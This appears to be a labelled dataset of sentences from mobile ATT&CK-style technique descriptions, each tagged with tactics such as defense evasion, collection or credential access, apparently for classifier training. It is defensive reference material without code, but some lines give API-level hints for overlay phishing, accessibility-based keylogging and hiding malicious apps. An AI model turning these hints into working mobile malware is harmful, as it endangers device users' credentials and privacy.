"This algorithm can be used to dynamically adjust parameters such as the domain name, IP address, or port number the malware uses for command and control.",COMMAND_AND_CONTROL,,,
Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol.,COMMAND_AND_CONTROL,,,
"Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.",COMMAND_AND_CONTROL,,,
"On Android versions prior to 7, apps can abuse Device Administrator access to reset the device lock passcode, preventing the user from unlocking the device.",IMPACT,,,
"After Android 7, only device or profile owners (e.g.",IMPACT,,,
MDMs) can reset the device’s passcode.,IMPACT,,,
"On iOS devices, this technique does not work because mobile device management servers can only remove the screen lock passcode; they cannot set a new passcode.",IMPACT,,,
"However, on jailbroken devices, malware has been discovered that can lock the user out of the device.",IMPACT,,,
Adversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via automatically and repeatedly executing malicious code.,PERSISTENCE,,,
"After gaining access to a victim’s system, adversaries may create or modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.",PERSISTENCE,,,
Values an adversary can provide about a target system or environment to use as guardrails may include environment information such as location.,DEFENSE_EVASION,,,
This use of guardrails is distinct from typical [System Checks].,DEFENSE_EVASION,,,
"While use of [System Checks] may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.",DEFENSE_EVASION,,,
Adversaries may opt to also encrypt and/or obfuscate these alternate channels.,EXFILTRATION,,,
Adversaries may employ custom or publicly available encoding/compression algorithms (such as base64) or embed data within protocol headers and fields.,EXFILTRATION,,,
Adversaries may exploit software vulnerabilities in order to to elevate privileges.,PRIVILEGE_ESCALATION,,,
"Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in an application, service, within the operating system software, or kernel itself to execute adversary-controlled code.",PRIVILEGE_ESCALATION,,,
"Security constructions, such as permission levels, will often hinder access to information and use of certain techniques.",PRIVILEGE_ESCALATION,,,
Adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.,PRIVILEGE_ESCALATION,,,
"When initially gaining access to a device, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system.",PRIVILEGE_ESCALATION,,,
"Vulnerabilities may exist, usually in operating system components and applications running at higher permissions, that can be exploited to gain higher levels of access on the system.",PRIVILEGE_ESCALATION,,,
This could enable someone to move from unprivileged or user- level permission to root permissions depending on the component that is vulnerable.,PRIVILEGE_ESCALATION,,,
"Adversaries may exploit remote services of enterprise servers, workstations, or other resources to gain unauthorized access to internal systems once inside of a network.",LATERAL_MOVEMENT,,,
Adversaries may exploit remote services by taking advantage of a mobile device’s access to an internal enterprise network through local connectivity or through a Virtual Private Network (VPN).,LATERAL_MOVEMENT,,,
"Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.",LATERAL_MOVEMENT,,,
A common goal for post-compromise exploitation of remote services is for lateral movement to enable access to a remote system.,LATERAL_MOVEMENT,,,
"An adversary may need to determine if the remote system is in a vulnerable state, which may be done through [Network Service Scanning] or other Discovery methods.",LATERAL_MOVEMENT,,,
"These look for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities, or security software that may be used to detect or contain remote exploitation.",LATERAL_MOVEMENT,,,
"Depending on the permissions level of the vulnerable remote service, an adversary may achieve [Exploitation for Privilege Escalation] as a result of lateral movement exploitation as well.",LATERAL_MOVEMENT,,,
Adversaries may wipe a device or delete individual files in order to manipulate external outcomes or hide activity.,DEFENSE_EVASION,,,
"An application must have administrator access to fully wipe the device, while individual files may not require special permissions to delete depending on their storage location.",DEFENSE_EVASION,,,
"Stored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats.",DEFENSE_EVASION,,,
"The impact file deletion will have depends on the type of data as well as the goals and objectives of the adversary, but can include deleting update files to evade detection or deleting attacker-specified files for impact.",DEFENSE_EVASION,,,
Adversaries may enumerate files and directories or search in specific device locations for desired information within a filesystem.,DISCOVERY,,,
"Adversaries may use the information from [File and Directory Discovery] during automated discovery to shape follow-on behaviors, including deciding if the adversary should fully infect the target and/or attempt specific actions.",DISCOVERY,,,
"On Android, Linux file permissions and SELinux policies typically stringently restrict what can be accessed by apps without taking advantage of a privilege escalation exploit.",DISCOVERY,,,
"The contents of the external storage directory are generally visible, which could present concerns if sensitive data is inappropriately stored there. iOS's security architecture generally restricts the ability to perform any type of [File and Directory Discovery] without use of escalated privileges.",DISCOVERY,,,
Adversaries may abuse Android's `startForeground()` API method to maintain continuous sensor access.,DEFENSE_EVASION,PERSISTENCE,,
"Beginning in Android 9, idle applications running in the background no longer have access to device sensors, such as the camera, microphone, and gyroscope.",DEFENSE_EVASION,PERSISTENCE,,
"Malicious applications may abuse the `startForeground()` API method to continue running in the foreground, while presenting a notification to the user pretending to be a genuine application.",DEFENSE_EVASION,PERSISTENCE,,
"This would allow unhindered access to the device’s sensors, assuming permission has been previously granted.",DEFENSE_EVASION,PERSISTENCE,,
"Malicious applications may also abuse the `startForeground()` API to inform the Android system that the user is actively interacting with the application, thus preventing it from being killed by the low memory killer.",DEFENSE_EVASION,PERSISTENCE,,
Adversaries may mimic common operating system GUI components to prompt users for sensitive information with a seemingly legitimate prompt.,COLLECTION,CREDENTIAL_ACCESS,,
"The operating system and installed applications often have legitimate needs to prompt the user for sensitive information such as account credentials, bank account information, or Personally Identifiable Information (PII).",COLLECTION,CREDENTIAL_ACCESS,,
"Compared to traditional PCs, the constrained display size of mobile devices may impair the ability to provide users with contextual information, making users more susceptible to this technique’s use.",COLLECTION,CREDENTIAL_ACCESS,,
There are several approaches adversaries may use to mimic this functionality.,COLLECTION,CREDENTIAL_ACCESS,,
"Adversaries may impersonate the identity of a legitimate application (e.g. use the same application name and/or icon) and, when installed on the device, may prompt the user for sensitive information.",COLLECTION,CREDENTIAL_ACCESS,,
"Additionally, adversaries may display a prompt on top of a running, legitimate application to trick users into entering sensitive information into a malicious application rather than the legitimate application.",COLLECTION,CREDENTIAL_ACCESS,,
"Typically, adversaries need to know when the targeted application and the individual activity within the targeted application is running in the foreground to display the prompt at the proper time.",COLLECTION,CREDENTIAL_ACCESS,,
Adversaries can abuse Android’s accessibility features to determine which application is currently in the foreground.,COLLECTION,CREDENTIAL_ACCESS,,
"Two known approaches to displaying a prompt include:

* Adversaries start a new activity on top of a running legitimate application.
* Adversaries create an application overlay window on top of a running legitimate application.",COLLECTION,CREDENTIAL_ACCESS,,
Applications must hold the `SYSTEM_ALERT_WINDOW` permission to create overlay windows.,COLLECTION,CREDENTIAL_ACCESS,,
"This permission is handled differently than typical Android permissions and, at least under certain conditions, is automatically granted to applications installed from the Google Play Store.",COLLECTION,CREDENTIAL_ACCESS,,
Adversaries may generate outbound traffic from devices.,IMPACT,,,
"This is typically performed to manipulate external outcomes, such as to achieve carrier billing fraud or to manipulate app store rankings or ratings.",IMPACT,,,
"Outbound traffic is typically generated as SMS messages or general web traffic, but may take other forms as well.",IMPACT,,,
"If done via SMS messages, Android apps must hold the `SEND_SMS` permission.",IMPACT,,,
"Additionally, sending an SMS message requires user consent if the recipient is a premium number.",IMPACT,,,
Applications cannot send SMS messages on iOS.,IMPACT,,,
Adversaries may use a device’s geographical location to limit certain malicious behaviors.,DEFENSE_EVASION,,,
"For example, malware operators may limit the distribution of a second stage payload to certain geographic regions.

[Geofencing] is accomplished by persuading the user to grant the application permission to access location services.",DEFENSE_EVASION,,,
"The application can then collect, process, and exfiltrate the device’s location to perform location-based actions, such as ceasing malicious behavior or showing region-specific advertisements.",DEFENSE_EVASION,,,
One method to accomplish [Geofencing] on Android is to use the built-in Geofencing API to automatically trigger certain behaviors when the device enters or exits a specified radius around a geographical location.,DEFENSE_EVASION,,,
"Similar to other [Geofencing] methods, this requires that the user has granted the `ACCESS_FINE_LOCATION` and `ACCESS_BACKGROUND_LOCATION` permissions.",DEFENSE_EVASION,,,
The latter is only required if the application targets Android 10 (API level 29) or higher.,DEFENSE_EVASION,,,
"However, Android 11 introduced additional permission controls that may restrict background location collection based on user permission choices at runtime.",DEFENSE_EVASION,,,
"These additional controls include ""Allow only while using the app"", which will effectively prohibit background location collection.",DEFENSE_EVASION,,,
"Similarly, on iOS, developers can use built-in APIs to setup and execute geofencing.",DEFENSE_EVASION,,,
"Depending on the use case, the app will either need to call `requestWhenInUseAuthorization()` or `requestAlwaysAuthorization()`, depending on when access to the location services is required.",DEFENSE_EVASION,,,
"Similar to Android, users also have the option to limit when the application can access the device’s location, including one-time use and only when the application is running in the foreground. [Geofencing] can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.",DEFENSE_EVASION,,,
"For example, location data could be used to limit malware spread and/or capabilities, which could also potentially evade application analysis environments (ex: malware analysis outside of the target geographic area).",DEFENSE_EVASION,,,
Other malicious usages could include showing language-specific input prompts and/or advertisements.,DEFENSE_EVASION,,,
"Mobile operating systems have features and developer APIs to hide various artifacts, such as an application’s launcher icon.",DEFENSE_EVASION,,,
"These APIs have legitimate usages, such as hiding an icon to avoid application drawer clutter when an application does not have a usable interface.",DEFENSE_EVASION,,,
Adversaries may abuse these features and APIs to hide artifacts from the user to evade detection.,DEFENSE_EVASION,,,
Adversaries may execute their own malicious payloads by hijacking the way operating systems run applications.,PERSISTENCE,,,
Hijacking execution flow can be for the purposes of persistence since this hijacked execution may reoccur over time.,PERSISTENCE,,,
There are many ways an adversary may hijack the flow of execution.,PERSISTENCE,,,
A primary way is by manipulating how the operating system locates programs to be executed.,PERSISTENCE,,,
How the operating system locates libraries to be used by a program can also be intercepted.,PERSISTENCE,,,
"Locations where the operating system looks for programs or resources, such as file directories, could also be poisoned to include malicious payloads.",PERSISTENCE,,,
Adversaries may utilize hooking to hide the presence of artifacts associated with their behaviors to evade detection.,DEFENSE_EVASION,,,
Hooking can be used to modify return values or data structures of system APIs and function calls.,DEFENSE_EVASION,,,
"This process typically involves using 3rd party root frameworks, such as Xposed or Magisk, with either a system exploit or pre-existing root access.",DEFENSE_EVASION,,,
"By including custom modules for root frameworks, adversaries can hook system APIs and alter the return value and/or system data structures to alter functionality/visibility of various aspects of the system.",DEFENSE_EVASION,,,
"This not only involves impairing preventative defenses, such as anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior.",DEFENSE_EVASION,,,
This may span both native defenses as well as supplemental capabilities installed by users or mobile endpoint administrators.,DEFENSE_EVASION,,,
Adversaries may exploit the lack of authentication in signaling system network nodes to track the to track the location of mobile devices by impersonating a node.,COLLECTION,DISCOVERY,,
"By providing the victim’s MSISDN (phone number) and impersonating network internal nodes to query subscriber information from other nodes, adversaries may use data collected from each hop to eventually determine the device’s geographical cell area or nearest cell tower.",COLLECTION,DISCOVERY,,
"Adversaries may delete, alter, or hide generated artifacts on a device, including files, jailbreak status, or the malicious application itself.",DEFENSE_EVASION,,,
"These actions may interfere with event collection, reporting, or other notifications used to detect intrusion activity.",DEFENSE_EVASION,,,
This may compromise the integrity of mobile security solutions by causing notable events or information to go unreported.,DEFENSE_EVASION,,,
Adversaries may transfer tools or other files from an external system onto a compromised device to facilitate follow-on actions.,COMMAND_AND_CONTROL,,,
Files may be copied from an external adversary-controlled system through the command and control channel or through alternate protocols with another tool such as FTP.,COMMAND_AND_CONTROL,,,
"During normal device usage, users often provide credentials to various locations, such as login pages/portals or system dialog boxes.",COLLECTION,CREDENTIAL_ACCESS,,
Input capture mechanisms may be transparent to the user (e.g. [Keylogging]) or rely on deceiving the user into providing input into what they believe to be a genuine application prompt (e.g. [GUI Input Capture]).,COLLECTION,CREDENTIAL_ACCESS,,
"A malicious application can inject input to the user interface to mimic user interaction through the abuse of Android's accessibility APIs.

[Input Injection] can be achieved using any of the following methods:

* Mimicking user clicks on the screen, for example to steal money from a user's PayPal account.
* Injecting global actions, such as `GLOBAL_ACTION_BACK` (programatically mimicking a physical back button press), to trigger actions on behalf of the user.
* Inserting input into text fields on behalf of the user.",DEFENSE_EVASION,IMPACT,,
This method is used legitimately to auto-fill text fields by applications such as password managers.,DEFENSE_EVASION,IMPACT,,
Adversaries may collect keychain data from an iOS device to acquire credentials.,CREDENTIAL_ACCESS,,,
"Keychains are the built-in way for iOS to keep track of users' passwords and credentials for many services and features such as Wi-Fi passwords, websites, secure notes, certificates, private keys, and VPN credentials.",CREDENTIAL_ACCESS,,,
"On the device, the keychain database is stored outside of application sandboxes to prevent unauthorized access to the raw data.",CREDENTIAL_ACCESS,,,
Standard iOS APIs allow applications access to their own keychain contained within the database.,CREDENTIAL_ACCESS,,,
"By utilizing a privilege escalation exploit or existing root access, adversaries can access the entire encrypted database.",CREDENTIAL_ACCESS,,,
Adversaries may log user keystrokes to intercept credentials or other information from the user as the user types them.,COLLECTION,CREDENTIAL_ACCESS,,
"Some methods of keylogging include:

* Masquerading as a legitimate third-party keyboard to record user keystrokes.",COLLECTION,CREDENTIAL_ACCESS,,
"On both Android and iOS, users must explicitly authorize the use of third-party keyboard apps.",COLLECTION,CREDENTIAL_ACCESS,,
"Users should be advised to use extreme caution before granting this authorization when it is requested.
* Abusing accessibility features.",COLLECTION,CREDENTIAL_ACCESS,,
"On Android, adversaries may abuse accessibility features to record keystrokes by registering an `AccessibilityService` class, overriding the `onAccessibilityEvent` method, and listening for the `AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED` event type.",COLLECTION,CREDENTIAL_ACCESS,,
"The event object passed into the function will contain the data that the user typed. 
*Additional methods of keylogging may be possible if root access is available.",COLLECTION,CREDENTIAL_ACCESS,,
Adversaries may track a device’s physical location through use of standard operating system APIs via malicious or exploited applications on the compromised device.,COLLECTION,DISCOVERY,,
"On Android, applications holding the `ACCESS_COAURSE_LOCATION` or `ACCESS_FINE_LOCATION` permissions provide access to the device’s physical location.",COLLECTION,DISCOVERY,,
"On Android 10 and up, declaration of the `ACCESS_BACKGROUND_LOCATION` permission in an application’s manifest will allow applications to request location access even when the application is running in the background.",COLLECTION,DISCOVERY,,
"On iOS, applications must include the `NSLocationWhenInUseUsageDescription`, `NSLocationAlwaysAndWhenInUseUsageDescription`, and/or `NSLocationAlwaysUsageDescription` keys in their `Info.plist` file depending on the extent of requested access to location information.",COLLECTION,DISCOVERY,,
An adversary with physical access to a mobile device may seek to bypass the device’s lockscreen.,INITIAL_ACCESS,,,
"Several methods exist to accomplish this, including:

* Biometric spoofing: If biometric authentication is used, an adversary could attempt to spoof a mobile device’s biometric authentication mechanism.",INITIAL_ACCESS,,,
"Both iOS and Android partly mitigate this attack by requiring the device’s passcode rather than biometrics to unlock the device after every device restart, and after a set or random amount of time.
* Unlock code bypass: An adversaries could attempt to brute-force or otherwise guess the lockscreen passcode (typically a PIN or password), including physically observing (“shoulder surfing”) the device owner’s use of the lockscreen passcode.",INITIAL_ACCESS,,,
"Mobile OS vendors partly mitigate this by implementing incremental backoff timers after a set number of failed unlock attempts, as well as a configurable full device wipe after several failed unlock attempts.
* Vulnerability exploit: Techniques have been periodically demonstrated that exploit mobile devices to bypass the lockscreen.",INITIAL_ACCESS,,,
The vulnerabilities are generally patched by the device or OS vendor once disclosed.,INITIAL_ACCESS,,,
Adversaries may use Android’s Native Development Kit (NDK) to write native functions that can achieve execution of binaries or functions.,DEFENSE_EVASION,EXECUTION,,
"Like system calls on a traditional desktop operating system, native code achieves execution on a lower level than normal Android SDK calls.",DEFENSE_EVASION,EXECUTION,,
"The NDK allows developers to write native code in C or C++ that is compiled directly to machine code, avoiding all intermediate languages and steps in compilation that higher level languages, like Java, typically have.",DEFENSE_EVASION,EXECUTION,,
The Java Native Interface (JNI) is the component that allows Java functions in the Android app to call functions in a native library.,DEFENSE_EVASION,EXECUTION,,
"Adversaries may also choose to use native functions to execute malicious code since native actions are typically much more difficult to analyze than standard, non-native behaviors.",DEFENSE_EVASION,EXECUTION,,
"Network DoS can be performed by exhausting the network bandwidth that services rely on, or by jamming the signal going to or coming from devices.",IMPACT,,,
A Network DoS will occur when an adversary is able to jam radio signals (e.g.,IMPACT,,,
"Wi-Fi, cellular, GPS) around a device to prevent it from communicating.",IMPACT,,,
"For example, to jam cellular signal, an adversary may use a handheld signal jammer, which jam devices within the jammer’s operational range.",IMPACT,,,
Usage of cellular jamming has been documented in several arrests reported in the news.,IMPACT,,,
"Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation.",DISCOVERY,,,
Methods to acquire this information include port scans and vulnerability scans from the mobile device.,DISCOVERY,,,
This technique may take advantage of the mobile device's access to an internal enterprise network either through local connectivity or through a Virtual Private Network (VPN).,DISCOVERY,,,
Adversaries may generate network traffic using a protocol and port paring that are typically not associated.,COMMAND_AND_CONTROL,,,
"For example, HTTPS over port 8088 or port 587 as opposed to the traditional port 443.",COMMAND_AND_CONTROL,,,
"Adversaries may attempt to make a payload or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the device or in transit.",DEFENSE_EVASION,,,
Portions of files can also be encoded to hide the plaintext strings that would otherwise help defenders with discovery.,DEFENSE_EVASION,,,
"Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled.",DEFENSE_EVASION,,,
"Adversaries may use an existing, legitimate external Web service channel as a means for sending commands to a compromised system without receiving return output.",COMMAND_AND_CONTROL,,,
Adversaries may communicate with compromised devices using out of band data streams.,COMMAND_AND_CONTROL,,,
"This could be done for a variety of reasons, including evading network traffic monitoring, as a backup method of command and control, or for data exfiltration if the device is not connected to any Internet-providing networks (i.e. cellular or Wi-Fi).",COMMAND_AND_CONTROL,,,
"Several out of band data streams exist, such as SMS messages, NFC, and Bluetooth.",COMMAND_AND_CONTROL,,,
"On Android, applications can read push notifications to capture content from SMS messages, or other out of band data streams.",COMMAND_AND_CONTROL,,,
This requires that the user manually grant notification access to the application via the settings menu.,COMMAND_AND_CONTROL,,,
"However, the application could launch an Intent to take the user directly there.",COMMAND_AND_CONTROL,,,
"On iOS, there is no way to programmatically read push notifications.",COMMAND_AND_CONTROL,,,
Adversaries may abuse the Android device administration API to prevent the user from uninstalling a target application.,DEFENSE_EVASION,,,
"In earlier versions of Android, device administrator applications needed their administration capabilities explicitly deactivated by the user before the application could be uninstalled.",DEFENSE_EVASION,,,
This was later updated so the user could deactivate and uninstall the administrator application in one step.,DEFENSE_EVASION,,,
Adversaries may also abuse the device accessibility APIs to prevent removal.,DEFENSE_EVASION,,,
This set of APIs allows the application to perform certain actions on behalf of the user and programmatically determine what is being shown on the screen.,DEFENSE_EVASION,,,
"The malicious application could monitor the device screen for certain modals (e.g., the confirmation modal to uninstall an application) and inject screen input or a back button tap to close the modal.",DEFENSE_EVASION,,,
Adversaries may attempt to get information about running processes on a device.,DISCOVERY,,,
Information obtained could be used to gain an understanding of common software/applications running on devices within a network.,DISCOVERY,,,
Recent Android security enhancements have made it more difficult to obtain a list of running processes.,DISCOVERY,,,
"On Android 7 and later, there is no way for an application to obtain the process list without abusing elevated privileges.",DISCOVERY,,,
This is due to the Android kernel utilizing the `hidepid` mount feature.,DISCOVERY,,,
"Prior to Android 7, applications could utilize the `ps` command or examine the `/proc` directory on the device.",DISCOVERY,,,
"In iOS, applications have previously been able to use the `sysctl` command to obtain a list of running processes.",DISCOVERY,,,
This functionality has been removed in later iOS versions.,DISCOVERY,,,
Adversaries may inject code into processes in order to evade process-based defenses or even elevate privileges.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
Both Android and iOS have no legitimate way to achieve process injection.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
The only way this is possible is by abusing existing root access or exploiting a vulnerability.,DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
"Adversaries may utilize standard operating system APIs to collect data from permission-backed data stores on a device, such as the calendar or contact list.",COLLECTION,,,
These permissions need to be declared ahead of time.,COLLECTION,,,
"On Android, they must be included in the application’s manifest.",COLLECTION,,,
"On iOS, they must be included in the application’s `Info.plist` file.",COLLECTION,,,
"In almost all cases, the user is required to grant access to the data store that the application is trying to access.",COLLECTION,,,
"In recent OS versions, vendors have introduced additional privacy controls for users, such as the ability to grant permission to an application only while the application is being actively used by the user.",COLLECTION,,,
"If the device has been jailbroken or rooted, an adversary may be able to access [Protected User Data] without the user’s knowledge or approval.",COLLECTION,,,
Adversaries may use a compromised device as a proxy server to the Internet.,DEFENSE_EVASION,,,
"By utilizing a proxy, adversaries hide the true IP address of their C2 server and associated infrastructure from the destination of the network traffic.",DEFENSE_EVASION,,,
"This masquerades an adversary’s traffic as legitimate traffic originating from the compromised device, which can evade IP-based restrictions and alerts on certain services, such as bank accounts and social media websites.",DEFENSE_EVASION,,,
The most common type of proxy is a SOCKS proxy.,DEFENSE_EVASION,,,
It can typically be implemented using standard OS-level APIs and 3rd party libraries with no indication to the user.,DEFENSE_EVASION,,,
"On Android, adversaries can use the `Proxy` API to programmatically establish a SOCKS proxy connection, or lower-level APIs to interact directly with raw sockets.",DEFENSE_EVASION,,,
"Ptrace system call injection may not be possible when targeting processes with high-privileges, and on some systems those that are non-child processes.",DEFENSE_EVASION,PRIVILEGE_ESCALATION,,
An adversary may use access to cloud services (e.g.,COLLECTION,DISCOVERY,,
Google's Android Device Manager or Apple iCloud's Find my iPhone) or to an enterprise mobility management (EMM)/mobile device management (MDM) server console to track the location of mobile devices managed by the service.,COLLECTION,DISCOVERY,,
Adversaries may move onto devices by exploiting or copying malware to devices connected via USB.,INITIAL_ACCESS,LATERAL_MOVEMENT,,
"In the case of Lateral Movement, adversaries may utilize the physical connection of a device to a compromised or malicious charging station or PC to bypass application store requirements and install malicious applications directly.",INITIAL_ACCESS,LATERAL_MOVEMENT,,
"Examples of this include: 
 
* Exploiting insecure bootloaders in a Nexus 6 or 6P device over USB and gaining the ability to perform actions including intercepting phone calls, intercepting network traffic, and obtaining the device physical location. 
* Exploiting weakly-enforced security boundaries in Android devices such as the Google Pixel 2 over USB. 
* Products from Cellebrite and Grayshift purportedly that can exploit some iOS devices using physical access to the data port to unlock the passcode.",INITIAL_ACCESS,LATERAL_MOVEMENT,,
"Adversaries may delete, alter, or send SMS messages without user authorization.",IMPACT,,,
"This could be used to hide C2 SMS messages, spread malware, or various external effects.",IMPACT,,,
This can be accomplished by requesting the `RECEIVE_SMS` or `SEND_SMS` permissions depending on what the malware is attempting to do.,IMPACT,,,
"If the app is set as the default SMS handler on the device, the `SMS_DELIVER` broadcast intent can be registered, which allows the app to write to the SMS content provider.",IMPACT,,,
"The content provider directly modifies the messaging database on the device, which could allow malicious applications with this ability to insert, modify, or delete arbitrary messages on the device.",IMPACT,,,
Adversaries may utilize standard operating system APIs to gather SMS messages.,COLLECTION,,,
"On Android, this can be accomplished using the SMS Content Provider. iOS provides no standard API to access SMS messages.",COLLECTION,,,
"If the device has been jailbroken or rooted, an adversary may be able to access [SMS Messages] without the user’s knowledge or approval.",COLLECTION,,,
"On Android and iOS, APIs and libraries exist to facilitate scheduling tasks to execute at a specified date, time, or interval.",EXECUTION,PERSISTENCE,,
"On Android, the `WorkManager` API allows asynchronous tasks to be scheduled with the system. `WorkManager` was introduced to unify task scheduling on Android, using `JobScheduler`, `GcmNetworkManager`, and `AlarmManager` internally. `WorkManager` offers a lot of flexibility for scheduling, including periodically, one time, or constraint-based (e.g. only when the device is charging).",EXECUTION,PERSISTENCE,,
"On iOS, the `NSBackgroundActivityScheduler` API allows asynchronous tasks to be scheduled with the system.",EXECUTION,PERSISTENCE,,
"The tasks can be scheduled to be repeating or non-repeating, however, the system chooses when the tasks will be executed.",EXECUTION,PERSISTENCE,,
"The app can choose the interval for repeating tasks, or the delay between scheduling and execution for one-time tasks.",EXECUTION,PERSISTENCE,,
"Adversaries may use screen capture to collect additional information about a target device, such as applications running in the foreground, user data, credentials, or other sensitive information.",COLLECTION,,,
Applications running in the background can capture screenshots or videos of another application running in the foreground by using the Android `MediaProjectionManager` (generally requires the device user to grant consent).,COLLECTION,,,
Adversaries may attempt to get a listing of security applications and configurations that are installed on a device.,DISCOVERY,,,
This may include things such as mobile security products.,DISCOVERY,,,
"Adversaries may use the information from [Security Software Discovery] during automated discovery to shape follow-on behaviors, including whether or not to fully infect the target and/or attempt specific actions.",DISCOVERY,,,
Adversaries may attempt to get a listing of applications that are installed on a device.,DISCOVERY,,,
"Adversaries may use the information from [Software Discovery] during automated discovery to shape follow-on behaviors, including whether or not to fully infect the target and/or attempts specific actions.",DISCOVERY,,,
"Adversaries may attempt to enumerate applications for a variety of reasons, such as figuring out what security measures are present or to identify the presence of target applications.",DISCOVERY,,,
Adversaries may perform software packing to conceal their code.,DEFENSE_EVASION,,,
An example packer is FTT.,DEFENSE_EVASION,,,
Adversaries can steal user application access tokens as a means of acquiring credentials to access remote systems and resources.,CREDENTIAL_ACCESS,,,
"This can occur through social engineering or URI hijacking and typically requires user action to grant access, such as through a system “Open With” dialogue.",CREDENTIAL_ACCESS,,,
Application access tokens are used to make authorized API requests on behalf of a user and are commonly used as a way to access resources in cloud-based applications and software-as-a-service (SaaS).,CREDENTIAL_ACCESS,,,
An OAuth access token enables a third-party application to interact with resources containing user data in the ways requested without requiring user credentials.,CREDENTIAL_ACCESS,,,
"Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.",DEFENSE_EVASION,,,
Adversaries may try to access and collect application data resident on the device.,COLLECTION,,,
"Adversaries often target popular applications, such as Facebook, WeChat, and Gmail.",COLLECTION,,,
"Due to mobile OS sandboxing, this technique is only possible in three scenarios: 

 

* An application stores files in unprotected external storage 
* An application stores files in its internal storage directory with insecure permissions (e.g. 777) 
* The adversary gains root permissions on the device.",COLLECTION,,,
Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted applications.,DEFENSE_EVASION,,,
Examples of such features include: an app being allowed to run because it is signed by a valid code signing certificate; an OS prompt alerting the user that an app came from an untrusted source; or getting an indication that you are about to connect to an untrusted site.,DEFENSE_EVASION,,,
"Supply chain compromise can take place at any stage of the supply chain including:

* Manipulation of development tools
* Manipulation of a development environment
* Manipulation of source code repositories (public or private)
* Manipulation of source code in open-source dependencies
* Manipulation of software update/distribution mechanisms
* Compromised/infected system images
* Replacement of legitimate software with modified versions
* Sales of modified/counterfeit products to legitimate distributors
* Shipment interdiction.",INITIAL_ACCESS,,,
"While supply chain compromise can impact any component of hardware or software, attackers looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.",INITIAL_ACCESS,,,
Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.,INITIAL_ACCESS,,,
"Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency, specifically with the widespread usage of third-party advertising libraries.",INITIAL_ACCESS,,,
A malicious application could suppress its icon from being displayed to the user in the application launcher.,DEFENSE_EVASION,,,
"This hides the fact that it is installed, and can make it more difficult for the user to uninstall the application.",DEFENSE_EVASION,,,
Hiding the application's icon programmatically does not require any special permissions.,DEFENSE_EVASION,,,
This behavior has been seen in the BankBot/Spy Banker family of malware.,DEFENSE_EVASION,,,
"Beginning in Android 10, changes were introduced to inhibit malicious applications’ ability to hide their icon.",DEFENSE_EVASION,,,
"If an app is a system app, requests no permissions, or does not have a launcher activity, the application’s icon will be fully hidden.",DEFENSE_EVASION,,,
"Further, if the device is fully managed or the application is in a work profile, the icon will be fully hidden.",DEFENSE_EVASION,,,
"Otherwise, a synthesized activity is shown, which is a launcher icon that represents the app’s details page in the system settings.",DEFENSE_EVASION,,,
"If the user clicks the synthesized activity in the launcher, they are taken to the application’s details page in the system settings.",DEFENSE_EVASION,,,
"Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic, rather than relying on any inherent protections provided by a communication protocol.",COMMAND_AND_CONTROL,,,
"Common symmetric encryption algorithms include AES, Blowfish, and RC4.",COMMAND_AND_CONTROL,,,
Adversaries may employ various system checks to detect and avoid virtualization and analysis environments.,DEFENSE_EVASION,,,
This may include changing behavior after checking for the presence of artifacts indicative of a virtual environment or sandbox.,DEFENSE_EVASION,,,
"If the adversary detects a virtual environment, they may alter their malware’s behavior to disengage from the victim or conceal the core functions of the implant.",DEFENSE_EVASION,,,
They may also search for virtualization artifacts before dropping secondary or additional payloads.,DEFENSE_EVASION,,,
Checks could include generic system properties such as host/domain name and samples of network traffic.,DEFENSE_EVASION,,,
"Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size.",DEFENSE_EVASION,,,
"Hardware checks, such as the presence of motion sensors, could also be used to gather evidence that can be indicative a virtual environment.",DEFENSE_EVASION,,,
Adversaries may also query for specific readings from these devices.,DEFENSE_EVASION,,,
"Adversaries may attempt to get detailed information about a device’s operating system and hardware, including versions, patches, and architecture.",DISCOVERY,,,
"Adversaries may use the information from [System Information Discovery] during automated discovery to shape follow-on behaviors, including whether or not to fully infects the target and/or attempts specific actions.",DISCOVERY,,,
"On Android, much of this information is programmatically accessible to applications through the `android.os.Build` class. iOS is much more restrictive with what information is visible to applications.",DISCOVERY,,,
"Typically, applications will only be able to query the device model and which version of iOS it is running.",DISCOVERY,,,
"Adversaries may look for details about the network configuration and settings, such as IP and/or MAC addresses, of operating systems they access or through information discovery of remote systems.",DISCOVERY,,,
"On Android, details of onboard network interfaces are accessible to apps through the `java.net.NetworkInterface` class.",DISCOVERY,,,
"On iOS, gathering network configuration information is not possible without root access.",DISCOVERY,,,
Adversaries may attempt to get a listing of network connections to or from the compromised device they are currently accessing or from remote systems by querying for information over the network.,DISCOVERY,,,
"This is typically accomplished by utilizing device APIs to collect information about nearby networks, such as Wi-Fi, Bluetooth, and cellular tower connections.",DISCOVERY,,,
"On Android, this can be done by querying the respective APIs: 

 

* `WifiInfo` for information about the current Wi-Fi connection, as well as nearby Wi-Fi networks.",DISCOVERY,,,
